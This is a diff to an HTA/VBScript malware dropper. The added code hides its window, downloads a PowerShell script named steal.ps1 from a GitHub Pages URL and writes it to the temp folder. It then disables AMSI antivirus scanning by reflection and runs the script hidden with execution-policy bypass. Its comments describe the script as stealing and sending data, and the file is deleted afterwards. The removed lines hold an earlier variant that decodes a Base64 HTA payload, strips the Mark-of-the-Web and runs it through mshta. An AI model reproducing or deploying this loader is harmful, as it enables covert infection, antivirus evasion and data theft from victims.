@@ -5,46 +5,36 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, xh, st, path, b64, xml, node, cleanB64
+Dim sh, fso, xh, ps1Content
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' 1. Fetch the Base64 payload from GitHub
-xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/payload.txt", False
+' 1. Download steal.ps1 from your GitHub
+xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
 xh.Send
 
 If xh.Status = 200 Then
-    b64 = xh.responseText
+    ps1Content = xh.responseText
+    Set xh = Nothing
+
+    ' 2. Save steal.ps1 to temp
+    Dim tempPs1 : tempPs1 = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
+    Dim f : Set f = fso.CreateTextFile(tempPs1, True)
+    f.Write ps1Content
+    f.Close
+
+    ' 3. Create an AMSI bypass string in PowerShell
+    Dim amsi : amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
+
+    ' 4. Run PowerShell with the AMSI bypass, then execute the script
+    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command """ & amsi & " & """ & tempPs1 & """"
     
-    ' 2. Remove line breaks and spaces so VBScript doesn't crash
-    cleanB64 = Replace(b64, vbCr, "")
-    cleanB64 = Replace(cleanB64, vbLf, "")
-    cleanB64 = Replace(cleanB64, vbTab, "")
-    cleanB64 = Replace(cleanB64, " ", "")
-    cleanB64 = Trim(cleanB64)
+    ' 5. Spawn and Wait (True flag waits for the script to finish stealing and sending)
+    sh.Run finalCmd, 0, True
     
-    path = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys.hta"
-    
-    ' 3. Decode the Base64 into the real HTA file
-    Set xml = CreateObject("MSXML2.DOMDocument")
-    Set node = xml.CreateElement("b64")
-    node.dataType = "bin.base64"
-    node.text = cleanB64
-    
-    Set st = CreateObject("ADODB.Stream")
-    st.Type = 1
-    st.Open
-    st.Write node.nodeTypedValue
-    st.SaveToFile path, 2
-    st.Close
-    
-    ' 4. Strip MOTW and run the local file hidden
-    On Error Resume Next
-    fso.DeleteFile path & ":Zone.Identifier", True
-    On Error GoTo 0
-    
-    sh.Run "mshta.exe """ & path & """", 0, False
+    ' 6. Cleanup
+    fso.DeleteFile tempPs1, True
 End If
 
 window.close()
